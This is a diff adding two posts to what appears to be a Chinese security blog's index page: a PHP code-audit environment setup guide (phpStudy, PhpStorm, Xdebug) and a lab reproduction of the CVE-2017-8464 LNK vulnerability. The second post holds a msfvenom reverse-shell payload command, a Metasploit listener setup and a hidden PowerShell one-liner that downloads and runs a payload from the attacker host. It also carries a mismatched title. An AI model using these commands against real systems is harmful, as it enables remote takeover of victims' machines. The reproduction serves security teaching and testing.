@@ -254,6 +254,602 @@
         
           <section id="main" style="float:none;">
   
+    <article id="post-代码审计环境搭建"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/16/代码审计环境搭建/">PHP代码审计环境搭建</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/16/代码审计环境搭建/" class="article-date">
+	  <time datetime="2017-10-16T09:52:08.000Z" itemprop="datePublished">2017-10-16</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP代码审计环境搭建"><a href="#PHP代码审计环境搭建" class="headerlink" title="PHP代码审计环境搭建"></a>PHP代码审计环境搭建</h1><h2 id="0x00-环境准备"><a href="#0x00-环境准备" class="headerlink" title="0x00 环境准备"></a>0x00 环境准备</h2><p>俗话说：工欲善其事必先利其器，高效的代码审计需要必要的工具支持。</p>
+<h4 id="1、PHP环境"><a href="#1、PHP环境" class="headerlink" title="1、PHP环境"></a>1、PHP环境</h4><ul>
+<li>PHP集成开发环境：<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy</a><ul>
+<li>phpStudy是Windows下一个PHP调试环境的程序集成包。该程序包集成Apache+Nginx+LightTPD+PHP+MySQL+phpMyAdmin+Zend Optimizer+Zend Loader 一次性安装，无须配置即可使用。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2、通用工具"><a href="#2、通用工具" class="headerlink" title="2、通用工具"></a>2、通用工具</h4><ul>
+<li><p>IDE ： <a href="http://www.jetbrains.com/phpstorm/" target="_blank" rel="noopener">PhpStorm</a></p>
+<ul>
+<li>PhpStorm是 JetBrains 公司开发的一款商用 PHP 集成开发工具 。</li>
+</ul>
+</li>
+<li><p>代码编辑器 ：<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a></p>
+<ul>
+<li>Sublime Text一个代码编辑器 ，由程序员Jon Skinner于2008年1月份所开发出来，Sublime Text 具有漂亮的用户界面和强大的功能。</li>
+</ul>
+</li>
+<li><p>网络调试工具： <a href="https://www.getpostman.com/" target="_blank" rel="noopener">Postman</a></p>
+<ul>
+<li>调试简单的css、html、脚本等简单的网页基本信息，发送所有类型的HTTP请求，调试WEB API的首选工具。</li>
+</ul>
+</li>
+<li><p>Xdebug工具 ：<a href="https://xdebug.org/" target="_blank" rel="noopener">xdebug</a></p>
+<ul>
+<li>Xdebug是PHP的扩展，用于协助调试和开发。它包含一个用于IDE 的单步调试器 。</li>
+</ul>
+</li>
+<li><p><a href="https://portswigger.net/burp/" target="_blank" rel="noopener">burpsuite </a>（神器不解释）</p>
+</li>
+</ul>
+<h4 id="3、自动化代码审计工具："><a href="#3、自动化代码审计工具：" class="headerlink" title="3、自动化代码审计工具："></a>3、自动化代码审计工具：</h4><ul>
+<li><p>Seay源代码审计系统（mysql 监控工具）</p>
+<ul>
+<li>国人开发的一套PHP源代码审计工具。</li>
+</ul>
+</li>
+<li><p><a href="http://cobra.feei.cn/installation" target="_blank" rel="noopener">cobra</a> ：支持多语言审计，暂时不支持Windows平台。</p>
+</li>
+<li><p><a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">RIPS</a>：free PHP security scanner using static code analysis：</p>
+</li>
+</ul>
+<h2 id="0x01-PHP-环境安装"><a href="#0x01-PHP-环境安装" class="headerlink" title="0x01 PHP 环境安装"></a>0x01 PHP 环境安装</h2><p>1、选择解压目录为 C:\phpStudy。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/87ieiL8g3j.png?imageslim" alt="mark"></p>
+<p>2、如图所示，phpStudy的目录结构。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/KimDb880Im.png?imageslim" alt="mark"></p>
+<p>3 、如果需要Visual C++ 运行库（Visual C++ Redistributable），可到微软官网下载。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/BAmHJidLah.png?imageslim" alt="mark"></p>
+<p>下载Visual C++ Redistributable for Visual Studio 2015。选择操作系统对应的位数。</p>
+<p><a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=48145" target="_blank" rel="noopener">http://www.microsoft.com/zh-cn/download/details.aspx?id=48145</a></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/mH77gccdDd.png?imageslim" alt="mark"></p>
+<p>进行安装。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/4fGIA49a47.png?imageslim" alt="mark"></p>
+<p>4、点击启动按钮可以看到phpStudy 已经成功启动。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/3iJLCDmADg.png?imageslim" alt="mark"></p>
+<p>5、点击MySQL管理器，我们常用MySQL-Front管理Mysql数据库。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/EeDdE38jaF.png?imageslim" alt="mark"></p>
+<p>6、 可以根据需要切换PHP对应版本。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/eK75kaedJA.png?imageslim" alt="mark"></p>
+<p>7、在 “其他选项管理器”，可以看到常见的一些使用的工具与常见的快捷按钮。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/H4jahfLcFH.png?imageslim" alt="mark"></p>
+<p>8、 点击“ My HomePage”</p>
+<p>在浏览器中可看到，环境正常。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/FFeKjJBb2k.png?imageslim" alt="mark">9、点击程序后可以，phpStudy 后台运行服务。可在屏幕右下角找到。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/aD9Cj8l3Ah.png?imageslim" alt="mark"></p>
+<p>10、 成功安装phpStudy集成环境，下面安装配置PHP代码调试环境。</p>
+<h2 id="0x02-通用工具安装配置"><a href="#0x02-通用工具安装配置" class="headerlink" title="0x02 通用工具安装配置"></a>0x02 通用工具安装配置</h2><h3 id="1、安装配置PhpStorm"><a href="#1、安装配置PhpStorm" class="headerlink" title="1、安装配置PhpStorm"></a>1、安装配置<a href="http://www.jetbrains.com/phpstorm/" target="_blank" rel="noopener">PhpStorm</a></h3><p>下载好phpstorm安装程序打开，根据提示，下一步即可安装。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/AcFCcD9Abf.png?imageslim" alt="mark"></p>
+<p>可以看到我们可以选择使用32位与64位版本的phpstorm。在这里要勾选下载JRE，可以自动下载安装JRE程序，点击下一步。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/g08JG1ceFB.png?imageslim" alt="mark"></p>
+<p>安装完成启动。</p>
+<p>可以选择激活和30试用,在这里我们选择30天试用。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/3lDgaJIFk7.png?imageslim" alt="mark"></p>
+<p>点击“Accept”</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/HD09BAJDmG.png?imageslim" alt="mark"></p>
+<p>可以看到PhpStorm正常启动。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/5IiBL2abBa.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/j53hcCmf3C.png?imageslim" alt="mark"></p>
+<h3 id="2、安装配置-Sublime-text"><a href="#2、安装配置-Sublime-text" class="headerlink" title="2、安装配置 Sublime text"></a>2、安装配置 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a></h3><p>安装 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a> ,一路next即可。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/kLgJk1EGE4.png?imageslim" alt="mark"></p>
+<p>这里需要Python环境。安装Python3.6</p>
+<p><a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">https://www.python.org/downloads/windows/</a></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/b4I82F0ihk.png?imageslim" alt="mark"></p>
+<p>安装 Python3.6，勾选添加Python环境变量，点击”Install Now “。即开始安装。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/6hgDDKGhm3.png?imageslim" alt="mark"></p>
+<p>可以看到成功安装Python环境。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/I2fme05i82.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/6LdEga51aB.png?imageslim" alt="mark"></p>
+<p>在<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text </a>Package Control组件在线安装</p>
+<ul>
+<li>按Ctrl+`调出console（注：避免热键冲突）</li>
+<li>粘贴以下代码到命令行并回车：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), <span class="string">'wb'</span>).write(urllib.request.urlopen( <span class="string">'http://sublime.wbond.net/'</span> + pf.replace(<span class="string">' '</span>,<span class="string">'%20'</span>)).read())</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/h6DKHIBckE.png?imageslim" alt="mark"></p>
+<p>​    重启Sublime Text 3。</p>
+<p>​    如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/Kc0cDck83e.png?imageslim" alt="mark"></p>
+<p>接下来可以安装一些插件。</p>
+<h3 id="3、安装Postman"><a href="#3、安装Postman" class="headerlink" title="3、安装Postman"></a>3、安装Postman</h3><p>下一步下一步即可，没什么可注意的的地方。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/74lh0558Ld.png?imageslim" alt="mark"></p>
+<h2 id="0x03-本地代码调试环境搭建"><a href="#0x03-本地代码调试环境搭建" class="headerlink" title="0x03  本地代码调试环境搭建"></a>0x03  本地代码调试环境搭建</h2><h3 id="1、安装-xdebug"><a href="#1、安装-xdebug" class="headerlink" title="1、安装  xdebug"></a>1、安装  <a href="https://xdebug.org/" target="_blank" rel="noopener">xdebug</a></h3><p>xdebug 网站：<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a></p>
+<h4 id="（1）下载对应操作系统和PHP版本的xdebug-库文件"><a href="#（1）下载对应操作系统和PHP版本的xdebug-库文件" class="headerlink" title="（1）下载对应操作系统和PHP版本的xdebug 库文件"></a>（1）下载对应操作系统和PHP版本的xdebug 库文件</h4><p><strong>需要特别注意的是需要下载对应操作系统和PHP版本的xdebug 库文件</strong>。phpStudy在查看phpinfo，可知php的各种参数。</p>
+<p><img src="C:\Users\shackle\AppData\Local\Temp\1533271285872.png" alt="1533271285872"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/H8kJi2bhii.png?imageslim" alt="mark"></p>
+<p>在官网上提供了一个推荐下载的方式。复制phpinfo 内容到以下这个网站粘贴上去。就可以得到链接下载。<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a>   <strong>目前这种方法只支持PHP大于7的版本。</strong></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/aHjGm98JLm.png?imageslim" alt="mark"></p>
+<p>如下图所示，可以看到下载链接。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/eaEmJB5a5C.png?imageslim" alt="mark"></p>
+<p>我们再刷新一下phpinfo。 可以看到，搜索xdebug成功安装上去。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/hH31cbgfaj.png?imageslim" alt="mark"></p>
+<p>如果 PHP 版本小于7那么就要到<a href="https://xdebug.org/download.php，手动下载需要的版本文件。" target="_blank" rel="noopener">https://xdebug.org/download.php，手动下载需要的版本文件。</a></p>
+<h4 id="（2）编辑php-ini"><a href="#（2）编辑php-ini" class="headerlink" title="（2）编辑php-ini"></a>（2）编辑php-ini</h4><p>可通过快捷方式打开，也可以进去其目录编辑php.ini文件。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/aEF5D5AG1I.png?imageslim" alt="mark"></p>
+<p>在php.ini文件最后面加上xdebug配置内容。 需要根据自己的环境修改</p>
+<ul>
+<li>zend_extension设置自己环境的xdebug.dll文件绝对路径。</li>
+<li>这里设置的监听的端口（xdebug.remote_port）是9001，下面步骤中使用9001端口配置。 </li>
+<li>idekey为360college。其他默认即可。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[xdebug]</span><br><span class="line">；xdebug.dll文件路径</span><br><span class="line">zend_extension =&quot;C:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug-2.5.5-5.6-vc11-nts.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9001</span><br><span class="line">xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="2、-PHPstorm配置"><a href="#2、-PHPstorm配置" class="headerlink" title="2、 PHPstorm配置"></a>2、 PHPstorm配置</h3><h4 id="（1）打开文件"><a href="#（1）打开文件" class="headerlink" title="（1）打开文件"></a>（1）打开文件</h4><p>点击open，打开需要调试的PHP文件。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/834hK3bEGA.png?imageslim" alt="mark"></p>
+<p>选择php文件目录。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/7f9imFEDm7.png?imageslim" alt="mark"></p>
+<h4 id="（2）设置PHP环境"><a href="#（2）设置PHP环境" class="headerlink" title="（2）设置PHP环境"></a>（2）设置PHP环境</h4><p>在File中打开Settings，配置设置。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/412i5FjcFm.png?imageslim" alt="mark"></p>
+<p>在设置界面中的PHP选项中添加PHP环境，即为我们之前设置的网站运行的PHP环境。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/aIIL4l0JfF.png?imageslim" alt="mark"></p>
+<p>编辑所需要的选项。</p>
+<p><img src="C:\Users\shackle\AppData\Local\Temp\1533364142489.png" alt="1533364142489"></p>
+<h4 id="（3）配置Debug"><a href="#（3）配置Debug" class="headerlink" title="（3）配置Debug"></a>（3）配置Debug</h4><p>在file-&gt;settings-&gt;Languages &amp; Frameworks-&gt;PHP ，选择Debug，设置监听的端口，要和之配置的端口一样。这里配置的是9001。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
+<p>还要设置DBGp Proxy 如下：端口同样为9001，key为之前设置的360college。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/7LlC4geibh.png?imageslim" alt="mark"></p>
+<h4 id="（4）配置-Server"><a href="#（4）配置-Server" class="headerlink" title="（4）配置 Server"></a>（4）配置 Server</h4><p>在File-&gt;settings-&gt;Languages Frameworks-&gt;PHP 中设置Server。新建Server，设置Name为需要名字，Host设置为localhost，端口等根据环境设置。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/8Ij1G0HLal.png?imageslim" alt="mark"></p>
+<h4 id="（5）配置调试选项"><a href="#（5）配置调试选项" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>在Run/Debug Configurations中新建PHP web Page。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/HF2EFdKB7J.png?imageslim" alt="mark"></p>
+<p>设置Name，选择server 为之前设置的server，根据环境设置Start URL结构。</p>
+<p>点击箭头所示Validate验证配置是否正确。如下为正确。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/lDblk9g17f.png?imageslim" alt="mark"></p>
+<h4 id="（6）开始调试"><a href="#（6）开始调试" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>​    在index.php文件中点击，打上断点。点击像小虫子一样的图标开始调试。可以看到弹出浏览器界面，调试开始。界面下方看到，调试参数。接下来可以进行代码走查，单步多部执行。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/KlJl260a2d.png?imageslim" alt="mark"></p>
+<p>执行调试，看到变量变化情况。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/2KLJ8kG1lm.png?imageslim" alt="mark"></p>
+<h3 id="3、-浏览器插件"><a href="#3、-浏览器插件" class="headerlink" title="3、 浏览器插件"></a>3、 浏览器插件</h3><p><a href="https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions" target="_blank" rel="noopener">https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions</a></p>
+<p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/</a></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180805/2f1kGE510a.png?imageslim" alt="mark"></p>
+<p>编码设置：</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180805/29f0B8Fkdc.png?imageslim" alt="mark"></p>
+<h2 id="0x04-远程代码调试环境搭建"><a href="#0x04-远程代码调试环境搭建" class="headerlink" title="0x04  远程代码调试环境搭建"></a>0x04  远程代码调试环境搭建</h2><h4 id="1、-PHP中配置xdebug"><a href="#1、-PHP中配置xdebug" class="headerlink" title="1、 PHP中配置xdebug"></a>1、 PHP中配置xdebug</h4><p>下载xdebug文件。</p>
+<p>PHP.ini 文件根据环境添加以下内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension =&quot;D:\phpStudy2018\PHPTutorial\php\php-5.4.45-nts\ext\php_xdebug-2.4.1-5.4-vc9-nts-x86_64.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line">;如果配置该项就不需要配xdebug.remote_host</span><br><span class="line">xdebug.remote_connect_back=1</span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9101</span><br><span class="line"></span><br><span class="line">;xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line">;配置id key</span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="2、-PhpStorm配置"><a href="#2、-PhpStorm配置" class="headerlink" title="2、 PhpStorm配置"></a>2、 PhpStorm配置</h4><h4 id="（1）SFTP同步代码"><a href="#（1）SFTP同步代码" class="headerlink" title="（1）SFTP同步代码"></a>（1）SFTP同步代码</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/6ej12BDa8K.png?imageslim" alt="mark"></p>
+<p>通过FTP/SFTP/FTPS下载服务器需要调试的代码，按照下图提示，下一步下一步进行配置。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/l7cd8HJGkE.png?imageslim" alt="mark"></p>
+<p>创建新的工程，工程名字根据需求填写。选择工程的目录路径。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/FmIEJDjjdC.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/LJECCJlmi2.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4gBj8B1Cgd.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/946hcD1fcK.png?imageslim" alt="mark"></p>
+<p>看到正在下载代码。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/BgaDBa9jdm.png?imageslim" alt="mark"></p>
+<h4 id="（2）配置-Debug"><a href="#（2）配置-Debug" class="headerlink" title="（2）配置 Debug"></a>（2）配置 Debug</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/0hK31AGab6.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
+<h4 id="（2）配置-Server"><a href="#（2）配置-Server" class="headerlink" title="（2）配置 Server"></a>（2）配置 Server</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/Fi332d1jB7.png?imageslim" alt="mark"></p>
+<h4 id="（5）配置调试选项-1"><a href="#（5）配置调试选项-1" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>待补充。</p>
+<h4 id="（6）开始调试-1"><a href="#（6）开始调试-1" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>待补充。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/16/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/">PHP代码审计环境搭建</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/16/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/" class="article-date">
+	  <time datetime="2017-10-16T09:52:08.000Z" itemprop="datePublished">2017-10-16</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"><a href="#Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）" class="headerlink" title="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"></a>Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）</h1><h2 id="漏洞实验原理"><a href="#漏洞实验原理" class="headerlink" title="漏洞实验原理"></a>漏洞实验原理</h2><p>&emsp;&emsp;攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名 。震网三代”LNK文件远程代码执行漏洞（CVE-2017-8464）可以用于穿透物理隔离网络。 </p>
+<p><strong>漏洞影响范围:</strong></p>
+<p>Windows 7</p>
+<p>Windows 8.1</p>
+<p>Windows RT 8.1</p>
+<p>Windows 10</p>
+<p>Windows Server 2008</p>
+<p>Windows Server 2008 R2</p>
+<p>Windows Server 2012</p>
+<p>Windows Server 2012 R2</p>
+<p>Windows Server 2016</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>msfvenom生成 powershell对应payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p  windows/x64/meterpreter/reverse_tcp lhost=192.168.0.11 [攻击机IP地址] -f  psh-reflection&gt;payload.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/hi5gLDca4i.png?imageslim" alt="mark"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/KLFj78D5ba.png?imageslim" alt="mark"></p>
+<p>输入密码360College</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv payload.ps1 /var/www/html</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g7cafhlcdk.png?imageslim" alt="mark"></p>
+<p>启动apache服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">service apache2 status</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/bEkG291m2d.png?imageslim" alt="mark"></p>
+<h3 id="第二步-msf监听"><a href="#第二步-msf监听" class="headerlink" title="第二步 msf监听"></a>第二步 msf监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost  192.168.0.11 [攻击机IP地址]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/Fc0Dm9L1m7.png?imageslim" alt="mark"></p>
+<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>登录靶机，在靶机上验证。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/E1I8B7e4e7.png?imageslim" alt="mark"></p>
+<p>在靶机桌面上新建快捷方式 ，插入对象的位置：</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/6dCd9I6i4l.png?imageslim" alt="mark"></p>
+<p>插入以下代码。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/k36iJkcHFg.png?imageslim" alt="mark"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.0.11/payload.ps1‘);test.ps1"</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/CJEELCB4cB.png?imageslim" alt="mark"></p>
+<p>再点击完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload.exe</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g2hbh5Ic7I.png?imageslim" alt="mark"></p>
+<p>点击payload.exe。</p>
+<p>在攻击机上可看到漏洞利用成功：</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g2DeG2Lf3k.png?imageslim" alt="mark"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-Covolutions Neural Netwrk"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
